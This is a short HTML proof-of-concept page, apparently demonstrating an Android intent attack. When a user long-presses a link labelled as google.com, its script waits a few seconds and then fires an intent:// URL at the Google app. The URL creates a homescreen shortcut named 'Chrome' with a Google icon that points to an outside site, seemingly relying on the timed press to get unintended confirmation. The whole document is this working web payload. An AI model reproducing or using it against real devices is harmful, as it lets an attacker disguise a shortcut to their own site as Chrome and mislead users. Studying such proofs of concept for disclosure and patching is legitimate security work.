
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Android Intent PoC</title>
  <style>
    body {
      font-family: system-ui, sans-serif;
      background: #f8f9fa;
      color: #202124;
      min-height: 100vh;
      margin: 0;
      display: grid;
      place-content: center;
      text-align: center;
    }

    a {
      display: inline-block;
      padding: 16px 28px;
      background: #1a73e8;
      color: white;
      text-decoration: none;
      font-weight: 600;
      border-radius: 8px;
    }

    a:active {
      background: #1557b0;
    }
  </style>
</head>
<body>

  <h2>Android Intent Test</h2>
  <a href="https://google.com" id="intentLink">
    Open Window & Android Intent Test
  </a>

  <script>
    let triggered = false;

    const link = document.getElementById("intentLink");

    link.addEventListener("contextmenu", () => {
      if (triggered) return;
      triggered = true;

      setTimeout(() => {
        const intentUrl =
          "intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";

        window.location.href = intentUrl;

        setTimeout(() => {
          triggered = false;
        }, 1120);

      }, 4400);
    });

    link.addEventListener("touchstart", () => {}, {
      passive: true
    });
  </script>

</body>
</html>
